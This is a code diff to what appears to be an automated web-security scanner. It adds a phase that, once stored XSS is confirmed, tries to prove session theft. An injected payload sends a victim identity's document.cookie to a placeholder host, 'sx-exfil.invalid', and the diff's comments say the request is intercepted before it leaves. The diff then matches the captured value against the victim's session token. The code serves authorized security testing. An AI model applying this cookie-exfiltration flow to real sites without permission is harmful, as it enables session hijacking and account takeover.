@@ -119,6 +119,11 @@ const COMPLIANCE = {
   'exposed-service': { owasp: 'A05:2021-Security Misconfiguration', cwe: 'CWE-306', mitre: ['TA0007', 'TA0008'] },
   'attack-chain': { owasp: 'A04:2021-Insecure Design', cwe: 'CWE-284', mitre: ['TA0004', 'TA0008', 'TA0040'] },
   impact: { owasp: 'A03:2021-Injection', cwe: 'CWE-89', mitre: ['TA0009', 'TA0002', 'TA0040'] },
+  'xss-session-theft': {
+    owasp: 'A07:2021-Identification and Authentication Failures',
+    cwe: 'CWE-539',
+    mitre: ['TA0006', 'TA0008'],
+  },
   'ai-verified': { owasp: 'A04:2021-Insecure Design', cwe: 'CWE-915', mitre: ['TA0004'] },
 };
 
@@ -1980,6 +1985,54 @@ export async function runWholeApp({
       }
     } catch (err) {
       log(`  (stored/dom-xss error: ${err.message})`);
+    }
+  }
+
+  // Stored-XSS → SESSION THEFT / account takeover. If stored XSS was PROVEN and a second (victim)
+  // identity is available, demonstrate the real blast radius: the stored payload runs in the victim's
+  // authenticated browser and beacons document.cookie to a sentinel host we intercept in-browser (the
+  // request is aborted — nothing leaves). Zero-FP: confirmed ONLY when the beacon carries the victim's
+  // own session token (an HttpOnly session cookie is unreadable → correctly no proof). Fully guarded.
+  if (headless) {
+    try {
+      const storedConfirmed = (report.exploits || []).some((e) => e.cls === 'stored-dom-xss' && e.confirmed > 0);
+      const victim = acIds.find((i) => i.label !== 'primary' && i.headers?.Cookie);
+      if (storedConfirmed && victim) {
+        const { proveXssExfil } = await import('./crawler-headless.mjs');
+        const { runXssImpact } = await import('./impact.mjs');
+        const oobHost = 'sx-exfil.invalid';
+        const victimCookies = victim.headers.Cookie.split(';')
+          .map((c) => c.trim())
+          .filter(Boolean)
+          .map((c) => {
+            const i = c.indexOf('=');
+            return i > 0 ? { name: c.slice(0, i), value: c.slice(i + 1), url: origin } : null;
+          })
+          .filter(Boolean);
+        // Match on the highest-entropy cookie value (the session token) — never a short flag cookie.
+        const victimSecret = victimCookies.map((c) => c.value).sort((a, b) => b.length - a.length)[0] || '';
+        const xssImpact = await runXssImpact({
+          targets: [origin],
+          victimSecret,
+          oobUrl: `http://${oobHost}/b`,
+          exfil: (payload) =>
+            proveXssExfil({
+              origin,
+              forms: formTargets,
+              pages: pageList,
+              attackerHeaders: headers,
+              victimCookies,
+              payload,
+              oobHost,
+            }),
+        });
+        if (xssImpact.length) {
+          log('\n=== STORED-XSS → SESSION-THEFT phase — victim cookie exfiltrated in a real browser ===');
+          recordClass(report, ws, 'xss-session-theft', xssImpact, log);
+        }
+      }
+    } catch (err) {
+      log(`  (xss-session-theft error: ${err.message})`);
     }
   }
 
